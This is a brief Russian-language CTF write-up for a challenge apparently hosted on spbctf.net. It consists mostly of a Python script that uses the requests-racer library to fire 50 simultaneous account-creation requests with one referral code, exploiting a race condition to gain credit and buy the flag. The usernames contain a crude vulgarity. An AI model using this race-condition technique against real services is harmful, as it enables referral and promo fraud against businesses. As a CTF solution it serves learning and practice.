Находим эндпоинты, Race Condition (много аккаунтов, один реф код)

```python
import requests
cookies = {
    '__cfduid': '51e90dc3f56fc7d883478061aafd7e12',
}
headers = {
    'Host': 't-galera-u12p5koe.spbctf.net',
    'Accept': '*/*',
    'Content-Type': 'application/json',
    'User-Agent': 'Galera/1 CFNetwork/1494.0.7 Darwin/23.4.0',
    'Accept-Language': 'en-GB,en;q=0.9',
    # 'Content-Length': '76',
    # 'Accept-Encoding': 'gzip, deflate, br',
    # 'Cookie': '__cfduid=51e90dc3f56fc7d883478061aafd7e12',
}
from requests_racer import SynchronizedAdapter
s = requests.Session()
sync = SynchronizedAdapter()
s.mount('http://', sync)
s.mount('https://', sync)
resps = [s.post(
    'https://t-galera-u12p5koe.spbctf.net/create',
    cookies=cookies,
    headers=headers,
    json={
    'ref_code': 'GALERA-60ae645b',
    'username': 'hui1234512x'+str(j),
    'password': 'hui1234512x'+str(j),
}
) for j in range(50)]
print(resps)
sync.finish_all()
print(resps)
```

[GitHub - nccgroup/requests-racer: Small Python library that makes it easy to exploit race conditions in web apps with Requests.](https://github.com/nccgroup/requests-racer)

Покупаем Свободу, забираем флаг
